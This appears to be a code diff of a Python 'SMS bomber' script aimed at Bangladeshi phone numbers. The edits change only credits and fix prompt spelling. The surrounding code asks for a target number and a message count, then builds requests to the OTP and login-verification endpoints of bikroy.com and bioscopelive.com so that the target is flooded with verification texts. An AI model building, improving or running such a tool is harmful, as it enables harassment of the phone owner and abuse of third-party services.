@@ -1,4 +1,4 @@
-# This Script edited by Fahad Rayhan
+# This Script Created by Fahad Rayhan
 # For sector 3.9 projects
 
 import os, sys, time, requests, random, string
@@ -71,7 +71,7 @@ def xak2(xak):
         sys.stdout.flush()
         time.sleep(0.07)
 
-print(w + "\033[1;36m[π] BD SMS booming ")
+print(w + "\033[1;36m[π] BD SMS Booming by Fahad Rayahn")
 
 try:
     request = requests.get("https://www.google.com/", timeout=2)
@@ -79,8 +79,8 @@ try:
 except (requests.ConnectionError, requests.Timeout) as exception:
     print("\033[1;36m\nsir, Your Internet Connection Is Poblian PLEASE Chik!")
     os.system("espeak \"sir, Your Internet Connection Is Poblian PLEASE Chik\"")
-number = input(f"{c}\n\033[1;36m[Sir  intir Your Tirgit Nonber] :{w} +880 ")
-amo = int(input(c + "\n\033[1;32m[AMOUNT] : " + w))
+number = input(f"{c}\n\033[1;36m[Hello! Enter Your Targeted Number] :{w} +880 ")
+amo = int(input(c + "\n\033[1;32m[AMOUNT OF SMS] : " + w))
 url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + number
 
 url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880" + number + "&operator=bd-otp"
